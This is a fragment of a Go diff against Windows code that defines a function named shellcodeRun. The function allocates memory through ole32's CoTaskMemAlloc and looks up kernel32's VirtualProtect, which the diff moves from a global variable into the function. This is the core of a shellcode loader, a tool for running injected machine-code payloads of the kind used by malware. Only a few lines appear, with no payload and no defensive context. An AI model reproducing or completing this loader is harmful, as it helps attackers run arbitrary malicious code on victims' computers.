@@ -11,7 +11,7 @@ import (
 
 var (
 	kernel32       = syscall.MustLoadDLL("kernel32.dll")
-	VirtualProtect = kernel32.MustFindProc("VirtualProtect")
+
 	old32          = syscall.MustLoadDLL("ole32.dll")
 	CoTaskMemAlloc = old32.MustFindProc("CoTaskMemAlloc")
 )
@@ -22,6 +22,7 @@ func shellcodeRun(code []byte) error {
 			fmt.Println(err)
 		}
 	}()
+	VirtualProtect := kernel32.MustFindProc("VirtualProtect")
 	l := uintptr(len(code))
 	pwstrLocal, _, _ := CoTaskMemAlloc.Call(l)
 
